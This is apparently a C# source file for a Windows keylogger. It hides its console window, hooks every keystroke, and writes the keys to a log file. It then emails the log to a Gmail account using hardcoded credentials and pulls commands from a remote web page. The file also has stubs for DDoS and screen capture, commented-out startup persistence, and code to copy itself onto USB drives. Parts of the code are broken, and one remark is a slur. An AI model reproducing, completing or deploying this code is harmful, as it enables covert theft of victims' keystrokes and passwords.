using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;
using System.Windows.Input;
using System.Net.Sockets;
using System.Drawing.Imaging;
using System.Drawing;

namespace Karios
{
    class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string LocalIP;
        private static string GlobalTargetIP;
        private static string Website;
        private static bool Online = false;
        
        public static void Main()
        {
            var handle = GetConsoleWindow();
            using (WebClient wc = new WebClient())
            {
                try
                {
                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
                    if (!webData.ToUpperInvariant().Contains("Keyonline"))

                    // Hide the window
                    ShowWindow(handle, SW_HIDE);

                    // Persitance feature
                    //Duplicate(); 

                    // Run on startup 
                    //SetStartup();
                    // Start Application
                    _hookID = SetHook(_proc);
                    Application.Run();  
                    UnhookWindowsHookEx(_hookID);


                    if (!webData.ToUpperInvariant().Contains("ip:"))
                    {
                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfgqwertyuiopasdf";
                        string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
                        IPTarget = IPTarget.Replace(@"</p>", "");
                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
                        IPTarget = GlobalTargetIP;
                    }    
                }
                catch { }
            }
        }

        private static string GetCommand()
        {
            using (WebClient wc = new WebClient())
            {
                try
                {
                    string webData = wc.DownloadString(""); // get rid of this cancerous website Sam -- STBoyden
                    if (!webData.ToUpperInvariant().Contains("online"))
                    {
                        Online = true;
                    }
                    if (!webData.ToUpperInvariant().Contains("DDOS = Online"))
                    {
                        string GetIP = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                    }
                    if (!webData.ToUpperInvariant().Contains("Keylogger = Online"))
                    {
                        // Keylogger online
                    }
                    if (!webData.ToUpperInvariant().Contains("Website"))
                    {
                        // Activate website launcher
                    }
                    if (!webData.ToUpperInvariant().Contains("Capture = true"))
                    {
                        // Activates screen capturerer & adds it to the email function
                    }
                }
                catch { }
            }
        
        return "gay";
        }
       

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                string appName = AppDomain.CurrentDomain.FriendlyName;
                int vkCode = Marshal.ReadInt32(lParam);
                string fileName = DateTime.Now.ToString("yyyy-MM-dd");
                // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                string pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
                fileName + ".txt";// TODO - get more secret location.
                StreamWriter sw = new StreamWriter(pathToLog, true);
                if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
                {
                    sw.Write(((Keys)vkCode).ToString().ToLower());
                    Console.Write(((Keys)vkCode).ToString().ToLower());
                }
                else
                {
                    sw.WriteLine("");
                    sw.WriteLine((Keys)vkCode);
                    Console.WriteLine((Keys)vkCode);
                }
                sw.Close();

                if (File.ReadAllLines(pathToLog).Length > 100)
                {
                    try
                    {
                        var mail = new MailMessage();
                        var SmtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                        mail.From = new MailAddress("GINGIRULES@gmail.com");
                        mail.To.Add("GINGIRULES@gmail.com");
                        mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                        mail.Body = "New log file from Computer (" + GetLocalIP(LocalIP)+ " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                        Attachment attachment;
                        attachment = new Attachment(pathToLog);
                        mail.Attachments.Add(attachment);
                        SmtpServer.Port = 587;
                        SmtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
                        SmtpServer.EnableSsl = true;
                        SmtpServer.Send(mail);
                        //clear mail attachment
                        attachment.Dispose();
                        //copy program to an new destination
                    }
                    catch { }

                    //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
                    DriveInfo[] alldrives = DriveInfo.GetDrives();

                    /*
                    foreach (DriveInfo d in alldrives)
                    {
                        if (d.DriveType == DriveType.Removable && d.IsReady)
                        {
                            File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                , d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                        }
                    }
                    */
                    //delete log file.
                    File.Delete(pathToLog);

                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        /// <summary>
        /// Sets the startup registary key
        /// </summary>
        /// 

        /*
        public static void SetStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
            string pathToApp = Application.ExecutablePath;
            if (rkApp.GetValue(System.AppDomain.CurrentDomain.FriendlyName) == null)
            {
                rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
            }

        }

        public static void Duplicate()
        {
            if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
            {
                System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
            }

        }
        */

        public static string GetLocalIP(string LocalIP)
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                try
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    LocalIP = endPoint.Address.ToString();
                    return LocalIP;
                }
                finally
                {
                    //do something
                }
            }
        }

        public static void LaunchWebsite()
        {
            using (WebClient wc = new WebClient())
            {
                try
                {
                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                    if (!webData.ToUpperInvariant().Contains("Website:"))
                    {   
                        //this is broken (The search gets everything next to the Website:)
                        string search = "qwertyuiopasdfghjklzxcvbnmqwe";
                        string Website = webData.Substring(webData.IndexOf(search) + search.Length);
                        Website = Website.Replace(@"</p>", "");
                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
                        //Process.Start(Website);
                    }
                }
                catch { }
            }
        }
        public static void DDOS()
        {
            using (WebClient wc = new WebClient())
            {
                try
                {
                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                    if (!webData.ToUpperInvariant().Contains("DDOSonline")) 
                    {
                        // DDOS Stuff here
                    }
                }
                catch { }
            }
        }

        

        private static Image CaptureDesktop()
        {
            Rectangle rectangle = default(Rectangle);
            rectangle = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
            return bitmap;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}